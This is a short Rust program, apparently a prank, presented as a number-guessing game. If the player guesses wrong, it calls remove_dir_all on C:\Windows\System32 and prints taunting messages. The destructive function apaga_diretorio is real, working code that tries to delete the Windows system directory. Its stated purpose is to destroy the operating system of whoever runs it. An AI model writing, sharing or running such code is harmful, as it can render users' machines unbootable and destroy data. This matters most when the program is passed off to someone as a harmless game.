use std::io;
use std::fs;
use rand::Rng;

fn main() {
    // Função principal com o "jogo" de advinhação
    println!("The computer will choose a random number between 1 and 5.
    You'll try to get the number right.
    If you miss it, System32 will be deleted. Good Luck!");
    println!("Write a number: ");
    let mut num_str: String = String::new();
    io::stdin().read_line(&mut num_str).expect("Error reading line");

    let num_num: i32 = num_str.trim().parse().expect("Error converting number");

    if num_num == gerar_aleatorio(5) {
        println!("You got lucky...");
    } else {
        apaga_diretorio();
    }
}

fn apaga_diretorio() {
    // Lê o caminho do diretório
    let diretorio = "C:\\Windows\\System32";

    // Função para remover o diretório
    match fs::remove_dir_all(diretorio){
        Ok(_) => {
            println!("You missed. Deleting System32 folder");
            println!("Better lucky next time...")
        } Err(err) => {
            eprintln!("Error deleting directory: {:?}", err);
        }
    }
}

fn gerar_aleatorio(n: i32) -> i32 {
    // Inicia função para gerar número aleatório
    let mut rng = rand::thread_rng();
    // Gera um número aleatório no range de 1 e 5
    let numero_aleatorio = rng.gen_range(1..=n);

    return numero_aleatorio
}
